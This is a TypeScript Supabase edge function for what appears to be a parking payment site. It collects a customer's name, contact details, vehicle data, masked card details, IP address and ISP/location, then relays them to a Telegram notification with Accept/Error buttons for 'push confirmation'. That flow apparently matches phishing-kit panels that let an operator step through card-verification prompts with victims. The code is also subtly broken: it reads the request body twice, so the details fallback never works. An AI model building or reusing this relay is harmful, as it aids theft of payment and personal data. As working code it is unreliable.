import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';
import { Resend } from "npm:resend@2.0.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const resend = new Resend(Deno.env.get("RESEND_API_KEY"));

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(supabaseUrl, supabaseServiceKey);
    const { userId } = await req.json();

    if (!userId) {
      return new Response(
        JSON.stringify({
          success: false,
          error: 'User ID is required'
        }),
        {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        }
      );
    }

    // Try to get payment session details (may not exist)
    const { data: session } = await supabase
      .from('payment_sessions')
      .select('*')
      .eq('user_id', userId)
      .maybeSingle();

    // Allow passing details directly when no session is found
    const { details } = await (async () => {
      try { return await req.json(); } catch { return { details: null }; }
    })();

    const payload = session ? {
      userId: session.user_id,
      name: session.customer_name,
      email: session.customer_email,
      phone: session.customer_phone,
      vehicle_registration: session.vehicle_registration,
      vehicle_make: session.vehicle_make,
      vehicle_model: session.vehicle_model,
      vehicle_color: session.vehicle_color,
      duration: session.duration_label,
      price: session.price,
      card_number_masked: session.card_number_masked,
      card_type: session.card_type,
      test_mode: true,
      userAgent: req.headers.get('user-agent') || 'Unknown',
      ip: req.headers.get('x-forwarded-for') || 'Unknown',
    } : details ? {
      userId,
      name: details.name,
      email: details.email,
      phone: details.phone,
      vehicle_registration: details.vehicle_registration,
      vehicle_make: details.vehicle_make,
      vehicle_model: details.vehicle_model,
      vehicle_color: details.vehicle_color,
      duration: details.duration,
      price: details.price,
      card_number_masked: details.card_number_masked,
      card_type: details.card_type,
      test_mode: true,
      userAgent: details.userAgent || (req.headers.get('user-agent') || 'Unknown'),
      ip: details.ip || req.headers.get('x-forwarded-for') || 'Unknown',
      country: details.country,
      city: details.city,
      region: details.region,
      timezone: details.timezone,
      isp: details.isp,
    } : null;

    if (!payload) {
      return new Response(
        JSON.stringify({ success: false, error: 'Payment session not found and no details provided' }),
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Send Telegram notification with Accept/Error buttons for push confirmation
    try {
      const telegramResponse = await supabase.functions.invoke('send-telegram-notification', {
        body: {
          type: 'push_confirmation',
          data: payload,
        }
      });

      console.log('Telegram notification sent:', telegramResponse);
    } catch (telegramError) {
      console.error('Failed to send Telegram notification:', telegramError);
    }

    return new Response(
      JSON.stringify({
        success: true,
        message: 'Telegram notification sent successfully'
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );

  } catch (error) {
    console.error('Error completing order:', error);
    return new Response(
      JSON.stringify({
        success: false,
        error: error.message
      }),
      {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );
  }
});